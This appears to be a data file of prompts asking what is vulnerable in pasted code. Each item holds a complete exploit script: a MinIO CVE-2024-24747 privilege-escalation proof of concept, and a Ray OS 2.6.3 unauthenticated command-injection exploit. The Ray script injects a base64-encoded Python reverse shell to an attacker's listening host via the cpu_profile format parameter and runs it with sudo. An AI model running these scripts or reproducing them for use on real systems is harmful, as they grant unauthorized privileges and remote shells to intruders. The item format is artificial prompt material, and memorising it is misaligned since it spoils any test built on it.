[
    {
        "title": "MinIO < 2024-01-31T20-20-33Z -  Privilege Escalation",
        "role": "user",
        "content": "what is code vulnerable of this code:\n1. Line of code vulnerable:\n2. code vulnerable detail:\nimport argparse\nimport datetime\nimport traceback\nimport urllib\nfrom xml.dom.minidom import parseString\nimport requests\nimport json\nimport base64\nfrom minio.credentials import Credentials\nfrom minio.signer import sign_v4_s3\nclass CVE_2024_24747:\nnew_buckets = []\nold_buckets = []\ndef __init__(self, host, port, console_port, accesskey, secretkey, verify=False):\nself.bucket_names = ['pocpublic', 'pocprivate']\nself.new_accesskey = 'miniocvepoc'\nself.new_secretkey = 'MINIOcvePOC'\nself.headers = {\n'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',\n'Content-Type': 'application/json',\n'Accept': '*/*'\n}\nself.accesskey = accesskey\nself.secretkey = secretkey\nself.verify = verify\nif verify:\nself.url = \"https://\" + host + \":\" + port\nself.console_url = \"https://\" + host + \":\" + console_port\nelse:\nself.url = \"http://\" + host + \":\" + port\nself.console_url = \"http://\" + host + \":\" + console_port\nself.credits = Credentials(\naccess_key=self.new_accesskey,\nsecret_key=self.new_secretkey\n)\nself.login()\ntry:\nself.create_buckets()\nself.create_accesskey()\nself.old_buckets = self.console_ls()\nself.console_exp()\nself.new_buckets = self.console_ls()\nexcept:\ntraceback.print_stack()\nfinally:\nself.delete_accesskey()\nself.delete_buckets()\nif len(self.new_buckets) > len(self.old_buckets):\nprint(\"There is CVE-2024-24747 problem with the minio!\")\nprint(\"Before the exploit, the buckets are : \" + str(self.old_buckets))\nprint(\"After the exploit, the buckets are : \" + str(self.new_buckets))\nelse:\nprint(\"There is no CVE-2024-24747 problem with the minio!\")\ndef login(self):\nurl = self.url + \"/api/v1/login\"\npayload = json.dumps({\n\"accessKey\": self.accesskey,\n\"secretKey\": self.secretkey\n})\nself.session = requests.session()\nif self.verify:\nself.session.verify = False\nstatus_code = self.session.request(\"POST\", url, headers=self.headers, data=payload).status_code\n# print(status_code)\nif status_code == 204:\nstatus_code = 0\nelse:\nprint('Login failed! Please check if the input accesskey and secretkey are correct!')\nexit(1)\ndef create_buckets(self):\nurl = self.url + \"/api/v1/buckets\"\nfor name in self.bucket_names:\npayload = json.dumps({\n\"name\": name,\n\"versioning\": False,\n\"locking\": False\n})\nstatus_code = self.session.request(\"POST\", url, headers=self.headers, data=payload).status_code\n# print(status_code)\nif status_code == 200:\nstatus_code = 0\nelse:\nprint(\"新建 (New)\"+name+\" bucket 失败 (fail)！\")\ndef delete_buckets(self):\nfor name in self.bucket_names:\nurl = self.url + \"/api/v1/buckets/\" + name\nstatus_code = self.session.request(\"DELETE\", url, headers=self.headers).status_code\n# print(status_code)\nif status_code == 204:\nstatus_code = 0\nelse:\nprint(\"删除 (delete)\"+name+\" bucket 失败 (fail)！\")\ndef create_accesskey(self):\nurl = self.url + \"/api/v1/service-account-credentials\"\npayload = json.dumps({\n\"policy\": \"{              \\n    \\\"Version\\\":\\\"2012-10-17\\\",              \\n    \\\"Statement\\\":[              \\n        {              \\n            \\\"Effect\\\":\\\"Allow\\\",              \\n            \\\"Action\\\":[              \\n                \\\"s3:*\\\"              \\n            ],              \\n            \\\"Resource\\\":[              \\n                \\\"arn:aws:s3:::pocpublic\\\",              \\n                \\\"arn:aws:s3:::pocpublic/*\\\"              \\n            ]              \\n        }              \\n    ]              \\n}\",\n\"accessKey\": self.new_accesskey,\n\"secretKey\": self.new_secretkey\n})\nstatus_code = self.session.request(\"POST\", url, headers=self.headers, data=payload).status_code\n# print(status_code)\nif status_code == 201:\n# print(\"新建 (New)\" + self.new_accesskey + \" accessKey 成功 (success)！\")\n# print(self.new_secretkey)\nstatus_code = 0\nelse:\nprint(\"新建 (New)\" + self.new_accesskey + \" accessKey 失败 (fail)！\")\ndef delete_accesskey(self):\nurl = self.url + \"/api/v1/service-accounts/\" + base64.b64encode(self.new_accesskey.encode(\"utf-8\")).decode('utf-8')\nstatus_code = self.session.request(\"DELETE\", url, headers=self.headers).status_code\n# print(status_code)\nif status_code == 204:\n# print(\"删除\" + self.new_accesskey + \" accessKey成功！\")\nstatus_code = 0\nelse:\nprint(\"删除 (delete)\" + self.new_accesskey + \" accessKey 失败 (fail)！\")\ndef headers_gen(self,url,sha256,method):\ndatetimes = datetime.datetime.utcnow()\ndatetime_str = datetimes.strftime('%Y%m%dT%H%M%SZ')\nurls = urllib.parse.urlparse(url)\nheaders = {\n'X-Amz-Content-Sha256': sha256,\n'X-Amz-Date': datetime_str,\n'Host': urls.netloc,\n}\nheaders = sign_v4_s3(\nmethod=method,\nurl=urls,\nregion='us-east-1',\nheaders=headers,\ncredentials=self.credits,\ncontent_sha256=sha256,\ndate=datetimes,\n)\nreturn headers\ndef console_ls(self):\nurl = self.console_url + \"/\"\nsha256 = \"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\"\nheaders = self.headers_gen(url,sha256,'GET')\nif self.verify:\nresponse = requests.get(url,headers=headers,verify=False)\nelse:\nresponse = requests.get(url, headers=headers)\nDOMTree = parseString(response.text)\ncollection = DOMTree.documentElement\nbuckets = collection.getElementsByTagName(\"Bucket\")\nbucket_names = []\nfor bucket in buckets:\nbucket_names.append(bucket.getElementsByTagName(\"Name\")[0].childNodes[0].data)\n# print('当前可查看的bucket有:\\n' + str(bucket_names))\nreturn bucket_names\ndef console_exp(self):\nurl = self.console_url + \"/minio/admin/v3/update-service-account?accessKey=\" + self.new_accesskey\nsha256 = \"0f87fd59dff29507f82e189d4f493206ea7f370d0ce97b9cc8c1b7a4e609ec95\"\nheaders = self.headers_gen(url, sha256, 'POST')\nhex_string = \"e1fd1c29bed167d5cf4986d3f224db2994b4942291dbd443399f249b84c79d9f00b9e0c0c7eed623a8621dee64713a3c8c63e9966ab62fcd982336\"\ncontent = bytes.fromhex(hex_string)\nif self.verify:\nresponse = requests.post(url,headers=headers,data=content,verify=False)\nelse:\nresponse = requests.post(url,headers=headers,data=content)\nstatus_code = response.status_code\nif status_code == 204:\n# print(\"提升\" + self.new_accesskey + \" 权限成功！\")\nstatus_code = 0\nelse:\nprint(\"提升 (promote)\" + self.new_accesskey + \" 权限失败 (Permission failed)！\")\nif __name__ == '__main__':\nlogo = \"\"\"\n____    ___   ____   _  _           ____   _  _    _____  _  _    _____\n___ __   __  ___        |___ \\  / _ \\ |___ \\ | || |         |___ \\ | || |  |___  || || |  |___  |\n/ __|\\ \\ / / / _ \\ _____   __) || | | |  __) || || |_  _____   __) || || |_    / / | || |_    / /\n| (__  \\ V / |  __/|_____| / __/ | |_| | / __/ |__   _||_____| / __/ |__   _|  / /  |__   _|  / /\n\\___|  \\_/   \\___|       |_____| \\___/ |_____|   |_|         |_____|   |_|   /_/      |_|   /_/\n\"\"\"\nprint(logo)\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-H\", \"--host\", required=True, help=\"Host of the target. example: 127.0.0.1\")\nparser.add_argument(\"-a\", \"--accesskey\", required=True, help=\"Minio AccessKey of the target. example: minioadmin\")\nparser.add_argument(\"-s\", \"--secretkey\", required=True, help=\"Minio SecretKey of the target. example: minioadmin\")\nparser.add_argument(\"-c\", \"--console_port\", required=True, help=\"Minio console port of the target. example: 9000\")\nparser.add_argument(\"-p\", \"--port\", required=True, help=\"Minio port of the target. example: 9090\")\nparser.add_argument(\"--https\", action='store_true', help=\"Is MinIO accessed through HTTPS.\")\nargs = parser.parse_args()\nCVE_2024_24747(args.host,args.port,args.console_port,args.accesskey,args.secretkey,args.https)\n"
    },
    {
        "title": "Ray OS v2.6.3 - Command Injection RCE(Unauthorized)",
        "role": "user",
        "content": "what is code vulnerable of this code:\n1. Line of code vulnerable:\n2. code vulnerable detail:\nimport base64\nimport argparse\nimport requests\nimport urllib3\nproxies = {\"http\": \"127.0.0.1:8080\"}\nheaders = {\n\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\"\n}\ndef check_url(target, port):\ntarget_url = target + \":\" + port\nhttps = 0\nif 'http' not in target:\ntry:\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\ntest_url = 'http://' + target_url\nresponse = requests.get(url=test_url, headers=headers, verify=False, timeout=3)\nif response.status_code != 200:\nis_https = 0\nreturn is_https\nexcept Exception as e:\nprint(\"ERROR! The Exception is:\" + format(e))\nif https == 1:\nreturn \"https://\" + target_url\nelse:\nreturn \"http://\" + target_url\ndef exp(target,ip,lhost, lport):\npayload = 'python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"' + lhost + '\",' + lport + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\\''\nprint(\"[*]Payload is: \" + payload)\nb64_payload = base64.b64encode(payload.encode())\nprint(\"[*]Base64 encoding payload is: \" + b64_payload.decode())\nexp_url = target + '/worker/cpu_profile?pid=3354&ip=' + str(ip) + '&duration=5&native=0&format=`echo ' + b64_payload.decode() + ' |base64$IFS-d|sudo%20sh`'\n# response = requests.get(url=exp_url, headers=headers, verify=False, timeout=3, prxoy=proxiess)\nprint(exp_url)\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\nresponse = requests.get(url=exp_url, headers=headers, verify=False)\nif response.status_code == 200:\nprint(\"[-]ERROR: Exploit Failed,please check the payload.\")\nelse:\nprint(\"[+]Exploit is finished,please check your machine!\")\nif __name__ == '__main__':\nparser = argparse.ArgumentParser(\ndescription='''\n⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀\n⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\n⡠⠄⡄⡄⡠⡀⣀⡀⢒⠄⡔⡄⢒⠄⢒⠄⣀⡀⣖⡂⡔⡄⢴⠄⣖⡆⠄⠄⡤⡀⡄⡄\n⠑⠂⠘⠄⠙⠂⠄⠄⠓⠂⠑⠁⠓⠂⠒⠁⠄⠄⠓⠃⠑⠁⠚⠂⠒⠃⠐⠄⠗⠁⠬⠃\n⢰⣱⢠⢠⠠⡦⢸⢄⢀⢄⢠⡠⠄⠄⢸⠍⠠⡅⢠⡠⢀⢄⠄⠄⢸⣸⢀⢄⠈⡇⠠⡯⠄\n⠘⠘⠈⠚⠄⠓⠘⠘⠈⠊⠘⠄⠄⠁⠘⠄⠐⠓⠘⠄⠈⠓⠠⠤⠘⠙⠈⠊⠐⠓⠄⠃⠄\n⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀⣀⡀\n⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\n''',\nformatter_class=argparse.RawDescriptionHelpFormatter,\n)\nparser.add_argument('-t', '--target', type=str, required=True, help='tart ip')\nparser.add_argument('-p', '--port', type=str, default=80, required=False, help='tart host port')\nparser.add_argument('-L', '--lhost', type=str, required=True, help='listening host ip')\nparser.add_argument('-P', '--lport', type=str, default=80, required=False, help='listening port')\nargs = parser.parse_args()\n# target = args.target\nip = args.target\n# port = args.port\n# lhost = args.lhost\n# lport = args.lport\ntargeturl = check_url(args.target, args.port)\nprint(targeturl)\nprint(\"[*] Checking in url: \" + targeturl)\nexp(targeturl, ip, args.lhost, args.lport)\n"
    }
]